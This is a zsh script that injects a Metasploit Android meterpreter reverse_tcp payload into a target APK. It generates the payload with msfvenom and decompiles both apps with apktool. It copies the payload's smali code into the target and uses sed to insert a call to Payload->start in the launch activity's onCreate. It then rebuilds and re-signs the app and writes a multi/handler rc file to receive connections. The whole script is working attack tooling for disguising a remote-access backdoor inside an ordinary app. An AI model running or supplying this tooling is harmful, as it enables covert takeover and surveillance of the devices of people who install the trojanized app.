#!/bin/zsh

trap "clean" SIGINT
clean(){
   echo -n "${RED}\tEXITING\n${RESET}"
   rm -rf $MSF_APK $MSF_F $RC_F
   exit 1

}
done_g(){
    echo -n  "${GREEN}\tDONE\n${RESET}"
}
error(){
   echo -n "${RED}\tERROR\n${RESET}"
}
HELP='''
  usage: script [options] target
  -h help
  -p LPORT (default 4444)
  -H LHOST (default 192.168.240.1) 
  -f Option apktool decode..: Force delete destination directory.
  -g Generate rc file for msfconsole
  ==================================================
  Dependencies: pyp, fdfind, msfvenom, ripgrep, uber
'''
LPORT=4444
LHOST=192.168.240.1
PAYLOAD="android/meterpreter/reverse_tcp"
F_GENERATE=1
TARGET_APK=""
SMALI_TAR_F=""
F_FORCE=0

while [ $# -gt 0 ]; do
  case $1 in
    -h)
    echo ${HELP}
    exit 0
      ;;
    -f)
    F_FORCE=1
    shift 1
      ;;
    -H)
    LHOST=$2
    shift 2
      ;;
    -o)
    F_GENERATE=1
    shift 1
      ;;
    -p)
    LPORT=$2
    shift 2
      ;;
    *)
    TARGET_APK=$1
    shift 1
      ;;
  esac
done
MSF_APK="msf_${LHOST}_${LPORT}.apk"
MSF_F=$(echo $MSF_APK | sed 's/.apk$//g')
TARGET_F=$(echo $TARGET_APK | sed 's/.apk$//g')
#Generate payload
echo -n "${GREEN}[ note ]${RESET} Generate meterpreter payload...."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $MSF_APK &> /dev/null
done_g
echo -n "${GREEN}[ note ]${RESET} Decode PAYLOAD ${MSF_APK}...."
if [[ $F_FORCE == 0 ]];then
   apktool d -r $MSF_APK -o $MSF_F &> /dev/null
else
   apktool d -f -r $MSF_APK -o $MSF_F &> /dev/null
 fi
done_g
echo -n "${GREEN}[ note ]${RESET} Decode TARGET ${TARGET_APK}...."
if [[ $F_FORCE == 0 ]]; then
  apktool d -r $TARGET_APK -o $TARGET_F &> /dev/null
else
  apktool d -f -r $TARGET_APK -o $TARGET_F &> /dev/null
fi  
done_g

echo -n "${GREEN}[ note ]${RESET} Search main activity...."
ACTIVITY_TARGET=$(aapt dump badging $TARGET_APK | sed -rn "/launchable-activity:/ s/.* name='([^']+)'.*/\1/p"| pyp -q "p.split('.')[-1]" 2>/dev/null | head -1)
[[ $ACTIVITY_TARGET != "" ]] && {
  echo -n "${BLUE}${ACTIVITY_TARGET}${RESET}"
  done_g
}
echo "${GREEN}[ note ]${RESET} Search folder to copy the metasploit folder...."
smali_folders=$(fdfind -t d -d 1 smali  $TARGET_F)
F_SMALI=""
c_f=1000000
n=1
while IFS=$'\n' read -r folder; do
  count_functions=$( rg -INc '.method' $folder | paste -s -d+ | bc )
    echo "$n) In folder: ${BLUE}${folder}${RESET} = $count_functions functions" 
  [ $count_functions -lt $c_f ] && {
    c_f=$count_functions
    F_SMALI=$folder
}
    n=$(expr $n + 1 )
done <<<$(echo $smali_folders)
[[ $F_SMALI != "" ]] && {
  f_metasploit=$(fdfind -t d metasploit $MSF_F)
  mkdir -p "${F_SMALI}/com"
  cp -r $f_metasploit $F_SMALI/com/
  echo -n "${GREEN}[ note ]${RESET} Selected folder is ${BLUE}${F_SMALI}${RESET}"
  done_g
} || error
ACTIVITY_FILE=$(fdfind $ACTIVITY_TARGET.smali $TARGET_F)
echo -n "${GREEN}[ note ]${RESET} Inject code the invoke metasploit in file ${BLUE}${ACTIVITY_FILE}${RESET}"
[[ $(rg -c metasploit $ACTIVITY_FILE) == "" ]] && {
  sed -ri '/.method public onCreate/,/.end method/ {/invoke-super/ a\ \tinvoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V 
}' $ACTIVITY_FILE 
  done_g
} || echo -n "${YELLOW}\tDONE\n${RESET}"
APK=$(echo $TARGET_APK | pyp "p.split('/')[-1]" 2>/dev/null)
echo -n "${GREEN}[ note ]${RESET} Build injected apk....\n"
apktool b ${TARGET_F} &&\
  echo -n  "${GREEN}[ note ]${RESET} Build injected apk ${GREEN}\tDONE\n${RESET}" ||\
  echo -n  "${RED}[ note ]${RESET} Build injected apk ${RED}\tFAIL\n${RESET}"
echo -n "${GREEN}[ note ]${RESET} Signing new apk...."
uber --allowResign -a $TARGET_F/dist/$APK &>/dev/null && echo -n "${GREEN}\tDONE\n${RESET}" || error
[ $F_GENERATE -eq 1 ] && {
  RC_F=$(echo $MSF_APK | sed 's/.apk$/.rc/')
echo -n "${GREEN}[ note ]${RESET} Generate rc config ${BLUE}${RC_F}${RESET}...."
  cat << EOF >> $RC_F
# [Kali]: msfdb start; msfconsole -q -r ${RC_F}
#
use exploit/multi/handler
set PAYLOAD 
set LHOST ${LHOST}
set LPORT ${LPORT}
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j

EOF
done_g
  }
clean
# echo "APK ${APK}, F_SMALI ${F_SMALI}, c_f ${c_f}, OUTPUT ${OUTPUT} , LPORT ${LPORT} , LHOST ${LHOST} , ACTIVITY_TARGET ${ACTIVITY_TARGET}"
#
#test
